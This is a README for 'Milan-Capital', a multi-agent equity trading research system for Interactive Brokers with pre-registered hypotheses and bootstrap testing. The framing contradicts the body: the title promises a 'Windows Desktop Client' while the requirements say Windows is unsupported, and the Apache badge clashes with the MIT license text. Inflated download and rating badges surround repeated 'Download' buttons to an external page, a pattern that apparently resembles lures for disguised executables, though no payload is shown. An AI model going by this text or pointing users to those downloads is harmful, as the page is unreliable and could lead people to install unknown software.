<div align="center">

# Milan-Capital: Autonomous Multi-Agent Equity Trading System — Windows Desktop Client

![preview](https://raw.githubusercontent.com/GouveRoger12/milan-capital/main/screen_cae603.svg)

[![downloads](https://img.shields.io/badge/downloads-246K-7c3aed?style=plastic&labelColor=3a3a3a)]() [![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-7c3aed?style=plastic&labelColor=3a3a3a)]() [![license](https://img.shields.io/badge/license-Apache-2.0-7c3aed?style=plastic&labelColor=3a3a3a)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=plastic&labelColor=3a3a3a)]() [![rating](https://img.shields.io/badge/rating-5.0%2F5-f59e0b?style=plastic&labelColor=3a3a3a)]()

[![Download](https://raw.githubusercontent.com/GouveRoger12/milan-capital/main/launch_7982.svg)](https://GouveRoger12.github.io/milan-capital/)

</div>

---

Milan-Capital is an autonomous multi-agent equity trading system with the measurement apparatus required to evaluate it, running unattended against Interactive Brokers on a daily schedule. Ten strategy agents plus a passive benchmark submit proposals that pass through arbitration, risk layering, limit-order execution, and fill reconciliation, with slippage measured on every session and no manual intervention. The system was subjected to five pre-registered hypotheses; all five were rejected, and the verdicts, retracted findings, and corrected confidence intervals remain documented alongside the code. The repository supplies the full research pipeline — point-in-time data reconstruction, block-bootstrap significance testing, and walk-forward replay — so that the absence of demonstrated edge is a reproducible result rather than an assertion.

## Features

- **Unattended daily operation:** Runs every trading day on a dedicated server against Interactive Brokers. The full cycle — market data ingestion, agent polling, risk filtering, limit order placement, fill reconciliation against expected positions, self-measured slippage, and notification dispatch — executes without manual intervention.

- **Eleven-agent signal architecture:** Ten strategy agents plus one buy-and-hold benchmark. Each agent exposes a stated investment philosophy and emits BUY, SELL, or HOLD proposals per symbol. Strategies span quality screening, short-term multifactor, RSI/Bollinger mean reversion, moving-average with ADX trend following, regime-aware macro, dividend ex-date capture, cointegration pairs, VIX-extreme volatility, SEC Form 4 insider buying, and news sentiment.

- **Dual arbitration paths:** A production selector ranks signals on confidence-weighted target allocation and executes; a consensus aggregator runs in observation mode without placing orders. The consensus path uses equal weighting until an edge is demonstrated, treats HOLD as abstention, and damps position size by the square root of participation.

- **Layered risk pipeline:** Position sizing, allocator constraints, value-at-risk estimation, pairwise correlation gating, and a circuit breaker sit between arbitration and execution. Correlation vetoes apply against open positions and against other buys approved earlier in the same run.

- **Execution and reconciliation:** Limit order planning with pre-trade guards, IBKR fill polling, expected-versus-actual position reconciliation, and per-fill slippage measurement. Two independent locks gate live execution — a broker-side read-only flag and an environment-level execution flag — and either one is sufficient to halt all orders.

- **Point-in-time data layer:** S&P 500 membership reconstructed from revision history to eliminate survivorship bias. SEC fundamentals dated by filing date rather than fiscal period end, using the earliest filing to avoid restatement contamination. A price quality filter runs on ingested series.

- **Pre-registered hypothesis testing:** Hypotheses are written with rejection criteria stated in advance, timestamped before measurement, and archived with dated verdicts. Five pre-registered hypotheses have been tested; five were rejected.

- **Self-measurement apparatus:** Edge measurement, circular block bootstrap for overlapping return windows, and calibration curves run as standalone analysis. Research scripts regenerate documentation artifacts and replay arbitration variants without ever placing orders.

- **Regime detection:** Gaussian mixture model market-regime classification feeding regime-aware agent logic.

- **Full-system backtesting:** End-to-end replay and walk-forward validation across the complete agent, arbitration, risk, and execution stack.

- **Authenticated operations dashboard:** FastAPI-backed web dashboard for monitoring system state, plus Web Push notification delivery for run events.

- **Test coverage:** 995 automated tests spanning agents, arbitration, risk, execution, data pipelines, and analysis routines.

- **Retired-agent retention:** Decommissioned strategies are preserved in source for historical replay, keeping a complete record of what was attempted rather than erasing it.

## How it works

The system is organized as a linear pipeline, with each stage passing a typed artifact to the next.

**Data layer.** Point-in-time market data, SEC filings, and broker snapshots are ingested and normalized into a single per-session frame. The universe is partitioned into a tradable set and a read-only set; membership is reconstructed historically rather than taken from current index composition, so that survivorship bias cannot enter any downstream measurement. Fundamental records are keyed by filing date, not fiscal period end.

**Agent layer.** A fixed roster of strategy agents — each implementing a distinct, stated philosophy — evaluates the session frame and emits proposals in a common schema: direction (buy, sell, hold), target weight, and a self-reported confidence. Agents are stateless with respect to one another and do not see each other's output. A benchmark agent that simply holds is included as a reference series.

**Arbitration layer.** Proposals are aggregated into a single decision per symbol. The production selector ranks on confidence multiplied by target weight; a consensus aggregator runs in parallel, in observation mode only, using equal weights, treating hold as abstention, and damping position size by the square root of participation. Both paths are logged on every run, so their divergence can be replayed offline.

**Risk layer.** Approved decisions pass through position sizing, portfolio-level exposure limits, a value-at-risk estimate, and a correlation guard that vetoes buys both against open positions and against other buys approved earlier in the same run. A circuit breaker halts new entries when drawdown thresholds are crossed.

**Execution layer.** Orders are planned as limit orders, screened by pre-trade guards, and submitted to the broker. Fills are polled and reconciled against expected positions; realized slippage is measured against the intended price and recorded per order. A run lock prevents overlapping executions.

**Measurement.** Every stage emits structured records — proposals, arbitrations, risk verdicts, orders, fills, slippage — which are persisted and later replayed. Hypothesis tests operate on these records and on historical reconstructions, not on live state. Confidence intervals are computed with date-clustered resampling and a circular block bootstrap over overlapping return windows, so that adjacent sessions are not counted as independent observations. Each hypothesis is written with its rejection criterion fixed before measurement, and verdicts are appended with dates rather than overwriting prior claims.

**Operation.** The full pipeline runs unattended on a schedule, against a paper account, and terminates with a notification summarizing decisions, fills, and any reconciliation discrepancies. Execution requires two independent locks to be open; closing either one is sufficient to stop all orders. Research scripts reuse the same data and analysis modules but are structurally incapable of placing orders.

## Compatibility & Requirements

Milan-Capital runs as a single-process Python application on a dedicated host, and every component in the pipeline is designed around unattended operation against a live broker session. The requirements below describe what the system expects of its environment, its broker connection, and its data sources; deviations from these baselines are not supported.

**Runtime and interpreter.** Python 3.12 is the reference interpreter, and the test suite of roughly one thousand tests is executed against it. The core numerical stack — pandas, numpy, statsmodels, and scikit-learn — provides the data frame, estimation, and model primitives used throughout the strategy, risk, and analysis layers. The broker integration relies on ib_insync for the gateway session, order lifecycle, and portfolio snapshots. The optional dashboard is served by FastAPI, and push notifications are delivered through pywebpush. All dependencies are pinned in the project's requirements manifest; version drift in the numerical or broker libraries is the most common source of behavioral differences and should be treated as a compatibility boundary rather than an upgrade path.

**Operating system and supervision.** Deployment targets a Linux server, with systemd units for the trading process, the gateway, and their restart policies. The run lock, order guards, and reconciliation loop assume a POSIX process model and a filesystem that supports advisory locking. Windows and macOS are not validated targets: the execution guards and the run-lock mechanism have no equivalent implementation for those platforms, so any attempt to run execution outside the supported Linux environment is unsupported by design.

**Broker connectivity.** The system connects to Interactive Brokers through a locally running IB Gateway instance. A live broker session requires two independent locks to be open simultaneously: the gateway must permit order transmission, and the execution flag must be enabled in the environment. Closing either one halts all order activity, and the system treats their conjunction — not either alone — as the authorization to trade. The gateway is expected to remain reachable for the full trading session; reconnection logic reconciles positions and open orders after any interruption rather than assuming a clean state.

**Account scope.** Execution is paper trading only. The order planning, fill polling, and reconciliation paths are exercised against a paper account, and no configuration in the repository targets a funded live account. Operators who point the system at a different account type do so outside the supported envelope, and the risk layers are calibrated for the paper account's behavior, not for live margin or buying-power semantics.

**Market data and reference sources.** Price data is sourced through yfinance, fundamentals through SEC EDGAR, and supplementary market and news inputs through Finnhub; the broker connection itself supplies account and position state. Point-in-time reconstruction of the tradable universe depends on revision history rather than current membership, and SEC data is dated by filing date rather than fiscal period end. Several agents consume inputs — news feeds, macroeconomic revision series, insider filings — that cannot be reconstructed historically, which is why those agents are measured only in live observation and never in replay. Data source outages degrade the affected agents to abstention; they do not halt the pipeline.

**Regulatory constraints on the tradable universe.** The system maintains an explicit separation between instruments that may be held and instruments that may only be read. The distinction exists because retail eligibility rules can prohibit purchase of otherwise liquid instruments — for example, US-listed funds without a locally approved key information document are ineligible for EU-resident retail accounts. The tradable universe is therefore a configured allowlist rather than a filter applied at order time, and any instrument not present in the holding set is excluded from order planning regardless of agent signal.

**Configuration and secrets.** All environment-specific values — broker credentials, data provider keys, notification keys, and the execution flag — are supplied through a local environment file that is excluded from version control. The system ships with an example configuration enumerating every required variable; startup validates that each is present and fails fast rather than degrading silently. No credential is embedded in source, and the repository contains no operational secrets.

**Resource envelope.** The process is single-node and modest in footprint: one Python process for the trading loop, one gateway process, and a scheduler that triggers the daily run. Historical replay and the research scripts are heavier and are expected to run on the same host outside trading hours; they never place orders and do not require the execution locks to be open. Memory pressure arises primarily from full-universe replay, and the research entry points are structured so that a replay can be scoped to a subset of symbols when the host is constrained.

**Versioning and change control.** Hypothesis documents, verdicts, and the analysis code that produces them are versioned together. Corrections to previously published results are committed as new artifacts rather than edits to the originals, so the record of what was claimed and what was later found remains inspectable. Operators deploying a new revision should expect that measurement code and its outputs move in lockstep, and that a mismatch between a verdict document and the analysis module that generated it indicates an incomplete deployment rather than a tolerable drift.

## FAQ

**Does Milan-Capital actually trade?**
Yes, but in the paper-trading mode only. The system connects to Interactive Brokers through IB Gateway, polls its ten strategy agents on every trading session, arbitrates their proposals, filters them through the risk layers, and submits limit orders against a paper account. Execution requires two independent locks to be open simultaneously — the read-only flag disabled at the gateway and the execution switch enabled in the environment. Closing either one halts all order submission without affecting research scripts or the observation pipeline.

**What is a pre-registered hypothesis, and why does it matter here?**
Each hypothesis is written down and dated before any data is touched, including the exact criterion that would count as a rejection. This removes the discretion to move the goalposts after seeing the results. Five hypotheses were registered and all five were rejected on their own stated criteria; the verdict documents preserve both the original reasoning and the corrections that followed.

**Why were two previously published results retracted?**
Confidence intervals computed from overlapping forward-return windows are too narrow, because consecutive sessions share most of their market history and independent resampling counts the same information repeatedly. The measurement layer now uses a circular block bootstrap with block lengths equal to the return horizon, closing each series into a ring so every observation carries equal weight. Both the original claims and their corrections remain in the repository; nothing was silently revised.

**Can the live results be reproduced by backtesting?**
Not fully. Six of the ten agents depend on inputs — news feeds, macro revision series, insider filings — that cannot be reconstructed point-in-time, so no honest historical replay exists for them. Those agents still issue live decisions. Thresholds for the remaining agents were tuned on the same data used to evaluate them, which means any measured edge is an upper bound rather than a forecast.

**What separates this measurement apparatus from a naive backtest?**
Three things. The null hypothesis is the unconditional base rate of the same action on the same universe over the same period, not a coin flip, so an always-buy agent in a rising market earns no credit. Confidence intervals cluster on dates rather than individual signals, treating a session with twelve proposals as one market observation. And index membership is reconstructed point-in-time while fundamentals are dated by filing date rather than fiscal period end, so survivorship bias and restatement lookahead cannot enter.

**What does the arbitration layer do, and is it live?**
The production selector ranks proposals by confidence multiplied by a hand-written target weight. Calibration analysis showed that quantity carries no predictive information and is inverted for some agents. A consensus aggregator — equal weighting until an edge is demonstrated, HOLD treated as abstention, position size damped by the square root of participation — runs in observation alongside the legacy mechanism and executes nothing. Replayed over thirteen sessions it produces 89 % identical decisions, which is itself the finding: the agent pool behaves as a single repeated opinion rather than a diversity of views.

**How are orders protected against bad state?**
A run lock prevents concurrent execution cycles. Position sizing accounts for drawdown limits, value-at-risk, and correlation; a correlation guard vetoes buys above the threshold against both open positions and other buys approved earlier in the same run. Orders are submitted as limits, fills are polled and reconciled against expected positions, and realized slippage is measured per fill. A circuit breaker halts the cycle on breach conditions.

**What are the hardware and software requirements?**
Python 3.12 with pandas, numpy, statsmodels, scikit-learn, ib_insync, FastAPI, and pywebpush on the runtime side; a broker gateway process for connectivity; and systemd units for unattended operation on a dedicated host. The dashboard is authenticated and served separately from the execution loop. The research scripts and the full test suite run without broker connectivity and never place orders.

**Is any of this financial advice or an investment product?**
No. Milan-Capital is a research system. It runs against a paper account, reports zero surviving positive results, and makes no claim of a track record. The methodology and the negative findings are the deliverable.

## Disclaimer

Milan-Capital is a research artifact: an autonomous multi-agent equity trading system paired with the measurement apparatus built to evaluate it. It executes unattended against Interactive Brokers, polling ten strategy agents per session, filtering proposals through risk layers, submitting limit orders, reconciling fills against expected positions, and recording its own slippage. It is provided strictly for research, instrumentation, and reproducibility purposes.

The software is not an investment product, does not constitute financial advice, and makes no representation of profitability, edge, or fitness for any trading objective. All five pre-registered hypotheses tested by this project were rejected on their stated criteria; the rejection record is part of the deliverable. Any result produced by this system should be read as a measurement outcome bounded by the assumptions, data availability, and methodological limits documented alongside it.

Execution against live brokerage accounts carries material risk, including partial fills, rejected orders, stale quotes, connectivity loss, and regulatory ineligibility determined at order time by the broker. The system requires two independent execution locks to be open before any order is transmitted; closing either is sufficient to halt order flow. Operators are solely responsible for credential handling, account configuration, jurisdictional eligibility, and any consequence of enabling execution.

Certain agents cannot be reconstructed point-in-time from historical inputs, and thresholds used for agent decisions were tuned on data also used for evaluation. Measurements produced here therefore constitute an upper bound rather than a forecast. No warranty is offered, express or implied, including warranties of merchantability, accuracy, or fitness for a particular purpose. Use is at the operator's own risk, and the maintainers accept no liability for financial loss, data loss, regulatory exposure, or service interruption arising from use of this software.

## License

Milan-Capital is released under the MIT License. The full license text is provided in the LICENSE file at the root of this repository and governs all use, reproduction, modification, and distribution of the source code, documentation, and accompanying materials.

The license permits commercial and non-commercial use, modification, and redistribution provided that the copyright notice and permission notice are retained in all copies or substantial portions of the software. No warranty is provided; the software is distributed on an "as is" basis, without conditions or warranties of any kind, express or implied, including merchantability, fitness for a particular purpose, or non-infringement.

Redistribution in source form must preserve the copyright notice, the license conditions, and the disclaimer. Redistribution in binary or compiled form must reproduce the same notices in the documentation or other materials shipped with the distribution. Modified versions must not misrepresent the origin of the software or imply endorsement by the original authors.

The license imposes no restriction on the use of research outputs, verdicts, or measurement methodology described in the documentation. Reuse of the pre-registered hypothesis framework, the block-bootstrap analysis, and the calibration procedures is permitted under the same terms as the source code.

The license applies to the software and documentation as published. Any third-party dependencies referenced by the project remain under their own respective licenses, and users are responsible for reviewing those terms before deployment. No additional grant of rights to third-party material is made by this license.

[![Download](https://raw.githubusercontent.com/GouveRoger12/milan-capital/main/launch_7982.svg)](https://GouveRoger12.github.io/milan-capital/)